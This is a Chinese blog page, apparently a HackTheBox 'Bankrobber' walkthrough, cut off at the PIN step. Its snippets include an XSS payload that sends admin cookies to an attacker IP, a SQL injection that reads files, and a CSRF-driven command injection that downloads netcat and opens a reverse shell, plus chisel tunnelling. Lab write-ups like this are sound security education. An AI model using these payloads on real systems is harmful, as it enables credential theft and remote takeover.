@@ -1,0 +1,804 @@
+<!DOCTYPE html>
+<html>
+<head>
+    
+
+    
+
+    
+
+
+
+    <meta charset="utf-8">
+    
+    
+    
+    
+    <title>Bankrobber - HackTheBox | 喵喵喵喵 | 某鱼唇的人类</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+    
+    <meta name="theme-color" content="#66CCFF">
+    
+    
+    <meta name="keywords" content="HackTheBox">
+    <meta name="description" content="基本信息 https:&#x2F;&#x2F;www.hackthebox.eu&#x2F;home&#x2F;machines&#x2F;profile&#x2F;209  10.10.10.154                                                                                                              端口扫描80,443,445,3306:">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Bankrobber - HackTheBox">
+<meta property="og:url" content="https://darkwing.moe/2020/12/29/Bankrobber-HackTheBox/index.html">
+<meta property="og:site_name" content="喵喵喵喵">
+<meta property="og:description" content="基本信息 https:&#x2F;&#x2F;www.hackthebox.eu&#x2F;home&#x2F;machines&#x2F;profile&#x2F;209  10.10.10.154                                                                                                              端口扫描80,443,445,3306:">
+<meta property="og:image" content="https://raw.githubusercontent.com/zjicmDarkWing/images2020/master/2020122901.jpg">
+<meta property="og:image" content="https://raw.githubusercontent.com/zjicmDarkWing/images2020/master/2020122902.jpg">
+<meta property="og:image" content="https://raw.githubusercontent.com/zjicmDarkWing/images2020/master/2020122903.jpg">
+<meta property="og:image" content="https://raw.githubusercontent.com/zjicmDarkWing/images2020/master/2020122904.jpg">
+<meta property="og:image" content="https://raw.githubusercontent.com/zjicmDarkWing/images2020/master/2020122905.jpg">
+<meta property="og:image" content="https://raw.githubusercontent.com/zjicmDarkWing/images2020/master/2020122906.jpg">
+<meta property="og:image" content="https://raw.githubusercontent.com/zjicmDarkWing/images2020/master/2020122907.jpg">
+<meta property="og:image" content="https://raw.githubusercontent.com/zjicmDarkWing/images2020/master/2020122908.jpg">
+<meta property="og:image" content="https://raw.githubusercontent.com/zjicmDarkWing/images2020/master/2020122909.jpg">
+<meta property="og:image" content="https://raw.githubusercontent.com/zjicmDarkWing/images2020/master/2020122910.jpg">
+<meta property="og:image" content="https://raw.githubusercontent.com/zjicmDarkWing/images2020/master/2020122911.jpg">
+<meta property="og:image" content="https://raw.githubusercontent.com/zjicmDarkWing/images2020/master/2020122912.jpg">
+<meta property="og:image" content="https://raw.githubusercontent.com/zjicmDarkWing/images2020/master/2020122913.jpg">
+<meta property="og:image" content="https://raw.githubusercontent.com/zjicmDarkWing/images2020/master/2020122914.jpg">
+<meta property="og:image" content="https://raw.githubusercontent.com/zjicmDarkWing/images2020/master/2020122915.jpg">
+<meta property="og:image" content="https://raw.githubusercontent.com/zjicmDarkWing/images2020/master/2020122916.jpg">
+<meta property="og:image" content="https://raw.githubusercontent.com/zjicmDarkWing/images2020/master/2020122917.jpg">
+<meta property="og:image" content="https://raw.githubusercontent.com/zjicmDarkWing/images2020/master/2020122918.jpg">
+<meta property="og:image" content="https://raw.githubusercontent.com/zjicmDarkWing/images2020/master/2020122919.jpg">
+<meta property="og:image" content="https://raw.githubusercontent.com/zjicmDarkWing/images2020/master/2020122920.jpg">
+<meta property="og:image" content="https://raw.githubusercontent.com/zjicmDarkWing/images2020/master/2020122921.jpg">
+<meta property="og:image" content="https://raw.githubusercontent.com/zjicmDarkWing/images2020/master/2020122922.jpg">
+<meta property="og:image" content="https://raw.githubusercontent.com/zjicmDarkWing/images2020/master/2020122923.jpg">
+<meta property="article:published_time" content="2020-12-29T07:02:48.000Z">
+<meta property="article:modified_time" content="2020-12-29T07:05:29.012Z">
+<meta property="article:author" content="暗羽">
+<meta property="article:tag" content="HackTheBox">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://raw.githubusercontent.com/zjicmDarkWing/images2020/master/2020122901.jpg">
+    
+        <link rel="alternate" type="application/atom+xml" title="喵喵喵喵" href="/atom.xml">
+    
+    <link rel="shortcut icon" href="/favicon.ico">
+    <link rel="stylesheet" href="//unpkg.com/hexo-theme-material-indigo@latest/css/style.css">
+    <script>window.lazyScripts=[]</script>
+
+    <!-- custom head -->
+    
+
+<meta name="generator" content="Hexo 4.2.0"></head>
+
+<body>
+    <div id="loading" class="active"></div>
+
+    <aside id="menu" class="hide" >
+  <div class="inner flex-row-vertical">
+    <a href="javascript:;" class="header-icon waves-effect waves-circle waves-light" id="menu-off">
+        <i class="icon icon-lg icon-close"></i>
+    </a>
+    <div class="brand-wrap" style="background-image:url(/img/brand.jpg)">
+      <div class="brand">
+        <a href="/" class="avatar waves-effect waves-circle waves-light">
+          <img src="/img/avatar.jpg">
+        </a>
+        <hgroup class="introduce">
+          <h5 class="nickname">暗羽</h5>
+          <a href="mailto:1126955201@qq.com" title="1126955201@qq.com" class="mail">1126955201@qq.com</a>
+        </hgroup>
+      </div>
+    </div>
+    <div class="scroll-wrap flex-col">
+      <ul class="nav">
+        
+            <li class="waves-block waves-effect">
+              <a href="/"  >
+                <i class="icon icon-lg icon-home"></i>
+                主页
+              </a>
+            </li>
+        
+            <li class="waves-block waves-effect">
+              <a href="/archives"  >
+                <i class="icon icon-lg icon-archives"></i>
+                Archives
+              </a>
+            </li>
+        
+            <li class="waves-block waves-effect">
+              <a href="/tags"  >
+                <i class="icon icon-lg icon-tags"></i>
+                Tags
+              </a>
+            </li>
+        
+            <li class="waves-block waves-effect">
+              <a href="/categories"  >
+                <i class="icon icon-lg icon-th-list"></i>
+                Categories
+              </a>
+            </li>
+        
+            <li class="waves-block waves-effect">
+              <a href="https://github.com/zjicmDarkWing" target="_blank" >
+                <i class="icon icon-lg icon-github"></i>
+                Github
+              </a>
+            </li>
+        
+            <li class="waves-block waves-effect">
+              <a href="https://www.weibo.com/zjicmDarkWing" target="_blank" >
+                <i class="icon icon-lg icon-weibo"></i>
+                Weibo
+              </a>
+            </li>
+        
+            <li class="waves-block waves-effect">
+              <a href="https://twitter.com/darkwing_nya" target="_blank" >
+                <i class="icon icon-lg icon-gratipay"></i>
+                彼女募集中
+              </a>
+            </li>
+        
+            <li class="waves-block waves-effect">
+              <a href="https://darkwing.moe/2015/01/01/%E4%B9%A6%E5%8D%95/"  >
+                <i class="icon icon-lg icon-link"></i>
+                一些链接
+              </a>
+            </li>
+        
+      </ul>
+    </div>
+  </div>
+</aside>
+
+    <main id="main">
+        <header class="top-header" id="header">
+    <div class="flex-row">
+        <a href="javascript:;" class="header-icon waves-effect waves-circle waves-light on" id="menu-toggle">
+          <i class="icon icon-lg icon-navicon"></i>
+        </a>
+        <div class="flex-col header-title ellipsis">Bankrobber - HackTheBox</div>
+        
+        <div class="search-wrap" id="search-wrap">
+            <a href="javascript:;" class="header-icon waves-effect waves-circle waves-light" id="back">
+                <i class="icon icon-lg icon-chevron-left"></i>
+            </a>
+            <input type="text" id="key" class="search-input" autocomplete="off" placeholder="Search">
+            <a href="javascript:;" class="header-icon waves-effect waves-circle waves-light" id="search">
+                <i class="icon icon-lg icon-search"></i>
+            </a>
+        </div>
+        
+        
+        <a href="javascript:;" class="header-icon waves-effect waves-circle waves-light" id="menuShare">
+            <i class="icon icon-lg icon-share-alt"></i>
+        </a>
+        
+    </div>
+</header>
+<header class="content-header post-header">
+
+    <div class="container fade-scale">
+        <h1 class="title">Bankrobber - HackTheBox</h1>
+        <h5 class="subtitle">
+            
+                <time datetime="2020-12-29T07:02:48.000Z" itemprop="datePublished" class="page-time">
+  2020-12-29
+</time>
+
+
+            
+        </h5>
+    </div>
+
+    
+
+
+</header>
+
+
+<div class="container body-wrap">
+    
+    <aside class="post-widget">
+        <nav class="post-toc-wrap post-toc-shrink" id="post-toc">
+            <h4>TOC</h4>
+            <ol class="post-toc"><li class="post-toc-item post-toc-level-1"><a class="post-toc-link" href="#基本信息"><span class="post-toc-number">1.</span> <span class="post-toc-text">基本信息</span></a><ol class="post-toc-child"><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#10-10-10-154"><span class="post-toc-number">1.1.</span> <span class="post-toc-text">10.10.10.154</span></a></li></ol></li><li class="post-toc-item post-toc-level-1"><a class="post-toc-link" href="#端口扫描"><span class="post-toc-number">2.</span> <span class="post-toc-text">端口扫描</span></a><ol class="post-toc-child"><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#80-443"><span class="post-toc-number">2.1.</span> <span class="post-toc-text">80&#x2F;443</span></a></li></ol></li><li class="post-toc-item post-toc-level-1"><a class="post-toc-link" href="#Web"><span class="post-toc-number">3.</span> <span class="post-toc-text">Web</span></a><ol class="post-toc-child"><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#XSS"><span class="post-toc-number">3.1.</span> <span class="post-toc-text">XSS</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#admin"><span class="post-toc-number">3.2.</span> <span class="post-toc-text">admin</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#notes-txt"><span class="post-toc-number">3.3.</span> <span class="post-toc-text">notes.txt</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#backdoorchecker"><span class="post-toc-number">3.4.</span> <span class="post-toc-text">backdoorchecker</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#cookie-js"><span class="post-toc-number">3.5.</span> <span class="post-toc-text">cookie.js</span></a></li></ol></li><li class="post-toc-item post-toc-level-1"><a class="post-toc-link" href="#SQL注入"><span class="post-toc-number">4.</span> <span class="post-toc-text">SQL注入</span></a><ol class="post-toc-child"><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#load-file"><span class="post-toc-number">4.1.</span> <span class="post-toc-text">load_file</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#backdoorchecker-php"><span class="post-toc-number">4.2.</span> <span class="post-toc-text">backdoorchecker.php</span></a></li></ol></li><li class="post-toc-item post-toc-level-1"><a class="post-toc-link" href="#XSS-XSRF-Shell"><span class="post-toc-number">5.</span> <span class="post-toc-text">XSS + XSRF &#x3D; Shell</span></a><ol class="post-toc-child"><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#shell-js"><span class="post-toc-number">5.1.</span> <span class="post-toc-text">shell.js</span></a></li></ol></li><li class="post-toc-item post-toc-level-1"><a class="post-toc-link" href="#user-flag"><span class="post-toc-number">6.</span> <span class="post-toc-text">user flag</span></a></li><li class="post-toc-item post-toc-level-1"><a class="post-toc-link" href="#提权信息"><span class="post-toc-number">7.</span> <span class="post-toc-text">提权信息</span></a><ol class="post-toc-child"><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#netstat-ano-findstr-LISTENING"><span class="post-toc-number">7.1.</span> <span class="post-toc-text">netstat -ano | findstr LISTENING</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#tasklist"><span class="post-toc-number">7.2.</span> <span class="post-toc-text">tasklist</span></a></li></ol></li><li class="post-toc-item post-toc-level-1"><a class="post-toc-link" href="#bankv2"><span class="post-toc-number">8.</span> <span class="post-toc-text">bankv2</span></a><ol class="post-toc-child"><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#overflow"><span class="post-toc-number">8.1.</span> <span class="post-toc-text">overflow</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#exploit"><span class="post-toc-number">8.2.</span> <span class="post-toc-text">exploit</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#brute-py"><span class="post-toc-number">8.3.</span> <span class="post-toc-text">brute.py</span></a></li></ol></li><li class="post-toc-item post-toc-level-1"><a class="post-toc-link" href="#root-flag"><span class="post-toc-number">9.</span> <span class="post-toc-text">root flag</span></a></li><li class="post-toc-item post-toc-level-1"><a class="post-toc-link" href="#参考资料"><span class="post-toc-number">10.</span> <span class="post-toc-text">参考资料</span></a></li></ol>
+        </nav>
+    </aside>
+
+
+<article id="post-Bankrobber-HackTheBox"
+  class="post-article article-type-post fade" itemprop="blogPost">
+
+    <div class="post-card">
+        <h1 class="post-card-title">Bankrobber - HackTheBox</h1>
+        <div class="post-meta">
+            <time class="post-time" title="2020-12-29 15:02:48" datetime="2020-12-29T07:02:48.000Z"  itemprop="datePublished">2020-12-29</time>
+
+            
+
+
+            
+<span id="busuanzi_container_page_pv" title="文章总阅读量" style='display:none'>
+    <i class="icon icon-eye icon-pr"></i><span id="busuanzi_value_page_pv"></span>
+</span>
+
+
+        </div>
+        <div class="post-content" id="post-content" itemprop="postContent">
+            <h1 id="基本信息"><a href="#基本信息" class="headerlink" title="基本信息"></a>基本信息</h1><ul>
+<li><p><a href="https://www.hackthebox.eu/home/machines/profile/209" target="_blank" rel="noopener">https://www.hackthebox.eu/home/machines/profile/209</a></p>
+</li>
+<li><h2 id="10-10-10-154"><a href="#10-10-10-154" class="headerlink" title="10.10.10.154"></a>10.10.10.154</h2></li>
+</ul>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images2020/master/2020122901.jpg" alt="" title="">
+                </div>
+                <div class="image-caption"></div>
+            </figure>
+
+<h1 id="端口扫描"><a href="#端口扫描" class="headerlink" title="端口扫描"></a>端口扫描</h1><p>80,443,445,3306:</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> nmap -sC -sV 10.10.10.154</span></span><br><span class="line">Starting Nmap 7.91 ( https://nmap.org ) at 2020-12-29 13:21 CST</span><br><span class="line">Nmap scan report for 10.10.10.154</span><br><span class="line">Host is up (0.068s latency).</span><br><span class="line">Not shown: 996 filtered ports</span><br><span class="line">PORT     STATE SERVICE      VERSION</span><br><span class="line">80/tcp   open  http         Apache httpd 2.4.39 ((Win64) OpenSSL/1.1.1b PHP/7.3.4)</span><br><span class="line">|_http-server-header: Apache/2.4.39 (Win64) OpenSSL/1.1.1b PHP/7.3.4</span><br><span class="line">|_http-title: E-coin</span><br><span class="line">443/tcp  open  ssl/http     Apache httpd 2.4.39 ((Win64) OpenSSL/1.1.1b PHP/7.3.4)</span><br><span class="line">|_http-server-header: Apache/2.4.39 (Win64) OpenSSL/1.1.1b PHP/7.3.4</span><br><span class="line">|_http-title: E-coin</span><br><span class="line">| ssl-cert: Subject: commonName=localhost</span><br><span class="line">| Not valid before: 2009-11-10T23:48:47</span><br><span class="line">|_Not valid after:  2019-11-08T23:48:47</span><br><span class="line">|_ssl-date: TLS randomness does not represent time</span><br><span class="line">| tls-alpn:</span><br><span class="line">|_  http/1.1</span><br><span class="line">445/tcp  open  microsoft-ds Microsoft Windows 7 - 10 microsoft-ds (workgroup: WORKGROUP)</span><br><span class="line">3306/tcp open  mysql        MariaDB (unauthorized)</span><br><span class="line">Service Info: Host: BANKROBBER; OS: Windows; CPE: cpe:/o:microsoft:windows</span><br><span class="line"></span><br><span class="line">Host script results:</span><br><span class="line">|_clock-skew: mean: 59m59s, deviation: 0s, median: 59m59s</span><br><span class="line">| smb-security-mode:</span><br><span class="line">|   account_used: guest</span><br><span class="line">|   authentication_level: user</span><br><span class="line">|   challenge_response: supported</span><br><span class="line">|_  message_signing: disabled (dangerous, but default)</span><br><span class="line">| smb2-security-mode:</span><br><span class="line">|   2.02:</span><br><span class="line">|_    Message signing enabled but not required</span><br><span class="line">| smb2-time:</span><br><span class="line">|   date: 2020-12-29T06:23:01</span><br><span class="line">|_  start_date: 2020-12-29T06:06:37</span><br><span class="line"></span><br><span class="line">Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .</span><br><span class="line">Nmap done: 1 IP address (1 host up) scanned in 99.34 seconds</span><br></pre></td></tr></table></figure>
+
+<h2 id="80-443"><a href="#80-443" class="headerlink" title="80/443"></a>80/443</h2><p>一个比特币交易所：</p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images2020/master/2020122902.jpg" alt="" title="">
+                </div>
+                <div class="image-caption"></div>
+            </figure>
+
+<h1 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h1><p>随意注册账号登录，有初始余额，可以转账操作,测试转账会提示Admin会查看审核：</p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images2020/master/2020122903.jpg" alt="" title="">
+                </div>
+                <div class="image-caption"></div>
+            </figure>
+
+<h2 id="XSS"><a href="#XSS" class="headerlink" title="XSS"></a>XSS</h2><p>因为提示管理员会查看，那就在comment那里尝试XSS，确认存在，并且可以发现admin路径，cookie中就是用户名密码的base64，那就直接xss打管理员cookie(XSS bot很不稳定，如果收不到请求就注销重新登录重试)：</p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images2020/master/2020122904.jpg" alt="" title="">
+                </div>
+                <div class="image-caption"></div>
+            </figure>
+
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script src&#x3D;&quot;http:&#x2F;&#x2F;10.10.14.15:7777&#x2F;cookie.js&quot;&gt;&lt;&#x2F;script&gt;</span><br></pre></td></tr></table></figure>
+
+<p>打到管理员cookie，解码得到admin密码：</p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images2020/master/2020122905.jpg" alt="" title="">
+                </div>
+                <div class="image-caption"></div>
+            </figure>
+
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">username&#x3D;YWRtaW4&#x3D;; password&#x3D;SG9wZWxlc3Nyb21hbnRpYw&#x3D;&#x3D;; id&#x3D;1</span><br><span class="line"></span><br><span class="line">admin : Hopelessromantic</span><br></pre></td></tr></table></figure>
+
+<h2 id="admin"><a href="#admin" class="headerlink" title="admin"></a>admin</h2><p>然后登录admin账号，现在我们是admin：</p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images2020/master/2020122906.jpg" alt="" title="">
+                </div>
+                <div class="image-caption"></div>
+            </figure>
+
+<p>admin顶部有一些链接，查看内容</p>
+<h2 id="notes-txt"><a href="#notes-txt" class="headerlink" title="notes.txt"></a>notes.txt</h2><p>notes提示这是xampp，现在还是默认目录；对localhost没有编码</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">- Move all files from the default Xampp folder: TODO</span><br><span class="line">- Encode comments for every IP address except localhost: Done</span><br><span class="line">- Take a break..</span><br></pre></td></tr></table></figure>
+
+<h2 id="backdoorchecker"><a href="#backdoorchecker" class="headerlink" title="backdoorchecker"></a>backdoorchecker</h2><p>页面还有个backdoorchecker功能，提示只能使用dir，输入dir后提示只能localhost请求：</p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images2020/master/2020122907.jpg" alt="" title="">
+                </div>
+                <div class="image-caption"></div>
+            </figure>
+
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images2020/master/2020122908.jpg" alt="" title="">
+                </div>
+                <div class="image-caption"></div>
+            </figure>
+
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images2020/master/2020122909.jpg" alt="" title="">
+                </div>
+                <div class="image-caption"></div>
+            </figure>
+
+<h2 id="cookie-js"><a href="#cookie-js" class="headerlink" title="cookie.js"></a>cookie.js</h2><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> request = <span class="keyword">new</span> XMLHttpRequest();</span><br><span class="line">request.open(<span class="string">'GET'</span>, <span class="string">'http://10.10.14.15:7777/?cookies='</span>+<span class="built_in">document</span>.cookie, <span class="literal">true</span>);</span><br><span class="line">request.send();</span><br></pre></td></tr></table></figure>
+
+<h1 id="SQL注入"><a href="#SQL注入" class="headerlink" title="SQL注入"></a>SQL注入</h1><p>admin页面还有个用户搜索功能，很基础的sql注入：</p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images2020/master/2020122910.jpg" alt="" title="">
+                </div>
+                <div class="image-caption"></div>
+            </figure>
+
+<p>判断列数，3列，直接回显1，2:</p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images2020/master/2020122911.jpg" alt="" title="">
+                </div>
+                <div class="image-caption"></div>
+            </figure>
+
+<h2 id="load-file"><a href="#load-file" class="headerlink" title="load_file"></a>load_file</h2><p>mysql有load_file可以读文件，结合前面的信息xampp默认路径，可以去读源码(这里已经可以直接去读user.txt了)：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&#39;union+select+1,load_file(&#39;c:\\xampp\\htdocs\\admin\\backdoorchecker.php&#39;),3;--+-</span><br></pre></td></tr></table></figure>
+
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images2020/master/2020122912.jpg" alt="" title="">
+                </div>
+                <div class="image-caption"></div>
+            </figure>
+
+<p>根据代码逻辑，我们可以通过XSS构造admin localhost的请求，使其执行任意命令</p>
+<h2 id="backdoorchecker-php"><a href="#backdoorchecker-php" class="headerlink" title="backdoorchecker.php"></a>backdoorchecker.php</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span>(<span class="string">'../link.php'</span>);</span><br><span class="line"><span class="keyword">include</span>(<span class="string">'auth.php'</span>);</span><br><span class="line"></span><br><span class="line">$username = base64_decode(urldecode($_COOKIE[<span class="string">'username'</span>]));</span><br><span class="line">$password = base64_decode(urldecode($_COOKIE[<span class="string">'password'</span>]));</span><br><span class="line">$bad 	  = <span class="keyword">array</span>(<span class="string">'$('</span>,<span class="string">'&amp;'</span>);</span><br><span class="line">$good 	  = <span class="string">"ls"</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(strtolower(substr(PHP_OS,<span class="number">0</span>,<span class="number">3</span>)) == <span class="string">"win"</span>)&#123;</span><br><span class="line">	$good = <span class="string">"dir"</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>($username == <span class="string">"admin"</span> &amp;&amp; $password == <span class="string">"Hopelessromantic"</span>)&#123;</span><br><span class="line">	<span class="keyword">if</span>(<span class="keyword">isset</span>($_POST[<span class="string">'cmd'</span>]))&#123;</span><br><span class="line">			<span class="comment">// FILTER ESCAPE CHARS</span></span><br><span class="line">			<span class="keyword">foreach</span>($bad <span class="keyword">as</span> $char)&#123;</span><br><span class="line">				<span class="keyword">if</span>(strpos($_POST[<span class="string">'cmd'</span>],$char) !== <span class="keyword">false</span>)&#123;</span><br><span class="line">					<span class="keyword">die</span>(<span class="string">"You're not allowed to do that."</span>);</span><br><span class="line">				&#125;</span><br><span class="line">			&#125;</span><br><span class="line">			<span class="comment">// CHECK IF THE FIRST 2 CHARS ARE LS</span></span><br><span class="line">			<span class="keyword">if</span>(substr($_POST[<span class="string">'cmd'</span>], <span class="number">0</span>,strlen($good)) != $good)&#123;</span><br><span class="line">				<span class="keyword">die</span>(<span class="string">"It's only allowed to use the $good command"</span>);</span><br><span class="line">			&#125;</span><br><span class="line"></span><br><span class="line">			<span class="keyword">if</span>($_SERVER[<span class="string">'REMOTE_ADDR'</span>] == <span class="string">"::1"</span>)&#123;</span><br><span class="line">				system($_POST[<span class="string">'cmd'</span>]);</span><br><span class="line">			&#125; <span class="keyword">else</span>&#123;</span><br><span class="line">				<span class="keyword">echo</span> <span class="string">"It's only allowed to access this function from localhost (::1).&lt;br&gt; This is due to the recent hack attempts on our server."</span>;</span><br><span class="line">			&#125;</span><br><span class="line">	&#125;</span><br><span class="line">&#125; <span class="keyword">else</span>&#123;</span><br><span class="line">	<span class="keyword">echo</span> <span class="string">"You are not allowed to use this function!"</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<h1 id="XSS-XSRF-Shell"><a href="#XSS-XSRF-Shell" class="headerlink" title="XSS + XSRF = Shell"></a>XSS + XSRF = Shell</h1><p>然后就是修改xss代码，让管理员执行命令，reverse shell：</p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images2020/master/2020122913.jpg" alt="" title="">
+                </div>
+                <div class="image-caption"></div>
+            </figure>
+
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images2020/master/2020122914.jpg" alt="" title="">
+                </div>
+                <div class="image-caption"></div>
+            </figure>
+
+
+
+<h2 id="shell-js"><a href="#shell-js" class="headerlink" title="shell.js"></a>shell.js</h2><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> request = <span class="keyword">new</span> XMLHttpRequest();</span><br><span class="line"><span class="keyword">var</span> params = <span class="string">'cmd=dir|powershell -c "iwr -uri 10.10.14.15:7777/nc64.exe -outfile %temp%\\n.exe"; %temp%\\n.exe -e cmd.exe 10.10.14.15 4445'</span>;</span><br><span class="line">request.open(<span class="string">'POST'</span>, <span class="string">'http://localhost/admin/backdoorchecker.php'</span>, <span class="literal">true</span>);</span><br><span class="line">request.setRequestHeader(<span class="string">'Content-type'</span>, <span class="string">'application/x-www-form-urlencoded'</span>);</span><br><span class="line">request.send(params);</span><br></pre></td></tr></table></figure>
+
+<h1 id="user-flag"><a href="#user-flag" class="headerlink" title="user flag"></a>user flag</h1><p>然后直接用户桌面得到user.txt:</p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images2020/master/2020122915.jpg" alt="" title="">
+                </div>
+                <div class="image-caption"></div>
+            </figure>
+
+<h1 id="提权信息"><a href="#提权信息" class="headerlink" title="提权信息"></a>提权信息</h1><p>C盘根目录有个bankv2.exe，当前用户没有权限:</p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images2020/master/2020122916.jpg" alt="" title="">
+                </div>
+                <div class="image-caption"></div>
+            </figure>
+
+<p>查看端口和进程发现bankv2.exe运行在本地的910端口,可以把端口转发出来：</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash"> <span class="built_in">local</span></span></span><br><span class="line">./chisel_1.7.0-rc7_darwin_amd64 server -p 8000 --reverse</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> target</span></span><br><span class="line">powershell -c "wget 10.10.14.15:7777/chisel.exe -o c.exe"</span><br><span class="line">c.exe client 10.10.14.15:8000 R:910:localhost:910</span><br></pre></td></tr></table></figure>
+
+<p> 然后测试连接本机910端口，提示需要4位pin码：</p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
